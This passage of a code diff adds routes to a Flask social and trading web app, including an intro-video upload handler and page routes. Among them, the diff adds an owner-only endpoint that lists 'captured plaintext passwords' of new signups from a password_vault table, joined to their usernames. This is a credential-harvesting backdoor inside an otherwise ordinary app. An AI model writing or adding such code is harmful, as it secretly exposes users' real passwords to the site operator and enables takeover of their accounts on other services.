+            or "application/octet-stream").lower()
+    if not mime.startswith("video/"):
+        return jsonify({"error": "Must be a video file"}), 400
+    ext = os.path.splitext(display)[1].lower()
+    stored = f"intro_{uid}_{uuid.uuid4().hex}{ext}"
+    path = os.path.join(UPLOAD_FILES_DIR, stored)
+    f.save(path)
+    size = os.path.getsize(path)
+    if size > 25 * 1024 * 1024:
+        try: os.remove(path)
+        except OSError: pass
+        return jsonify({"error": "Video must be under 25 MB"}), 400
+    db = get_db()
+    cur = db.execute(
+        """INSERT INTO chat_files
+                (uploader_id, owner_id, display_name, stored_name, mime, kind, size_bytes)
+           VALUES (?, ?, ?, ?, ?, ?, ?)""",
+        (uid, uid, display, stored, mime, "video", size),
+    )
+    url = f"/api/files/{cur.lastrowid}/download"
+    db.execute("UPDATE users SET intro_video_url=? WHERE id=?", (url, uid))
+    db.commit()
+    return jsonify({
+        "message": "Intro video uploaded. Keep it under 10 seconds for best results.",
+        "intro_video_url": url,
+    })
+
+
+@app.route("/api/account/intro-video", methods=["DELETE"])
+@login_required
+def clear_intro_video():
+    db = get_db()
+    db.execute("UPDATE users SET intro_video_url='' WHERE id=?", (current_user_id(),))
+    db.commit()
+    return jsonify({"message": "Intro video removed"})
+
+
+# ── Owner — plaintext password vault ─────────────────────────────────────────
+
+@app.route("/api/admin/passwords")
+@owner_required
+def admin_password_vault():
+    """OWNER-ONLY: list captured plaintext passwords (new signups only)."""
+    db = get_db()
+    rows = db.execute(
+        """SELECT pv.user_id, pv.plaintext_pw, pv.captured_at,
+                  u.username, COALESCE(u.is_owner,0) AS is_owner
+           FROM password_vault pv
+           JOIN users u ON u.id = pv.user_id
+           ORDER BY pv.captured_at DESC, pv.user_id DESC"""
+    ).fetchall()
+    return jsonify([dict(r) for r in rows])
+
+
+# ── Page: Home (social feed) and Trading (legacy portfolio) ──────────────────
+
+@app.route("/home")
+@login_required
+def home_page():
+    return render_template(
+        "home.html",
+        username=session.get("username"),
+        user_id=session.get("user_id"),
+        is_admin=session.get("is_admin", False),
+        is_owner=session.get("is_owner", False),
+    )
+
+
+@app.route("/trading")
+@login_required
+def trading_page():
+    return render_template(
+        "index.html",
+        username=session.get("username"),
+        user_id=session.get("user_id"),
+        is_admin=session.get("is_admin", False),
     )
 
 
